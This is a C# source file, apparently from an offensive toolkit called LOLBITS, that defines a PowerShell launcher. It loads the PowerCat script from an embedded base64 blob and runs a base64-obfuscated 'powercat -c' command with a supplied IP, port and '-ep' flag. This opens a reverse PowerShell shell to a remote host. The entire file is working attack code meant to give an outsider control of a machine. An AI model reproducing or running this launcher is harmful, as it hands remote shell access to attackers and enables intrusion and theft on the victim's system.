using System;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Threading;

namespace LOLBITS.Controlling
{
    public class LauncherPowershell
    {
        public static void Main(string ip, string port)
        {
            var obj = new LauncherPowershell();

            var thr1 = new Thread(ExecutePowershell);

            var a = new object[] {ip, port };
            thr1.Start(a);
        }

        private static void ExecutePowershell(object args)
        {
            var a = (object[])args;
            var ip = (string)a[0];
            var port = (string)a[1];

            RunspaceConfiguration rspace = RunspaceConfiguration.Create();
            using(Runspace rs = RunspaceFactory.CreateRunspace(rspace))
            {
                rs.Open();

                var pipeline = rs.CreatePipeline();
                pipeline.Commands.AddScript(PowerCat.PowerCatBase64());
                pipeline.Commands.AddScript(Encoding.UTF8.GetString(Convert.FromBase64String("cG93ZXJjYXQgLWMg")) + ip + "  " + port + " -ep");
                pipeline.Invoke();
            }
        }
    }
}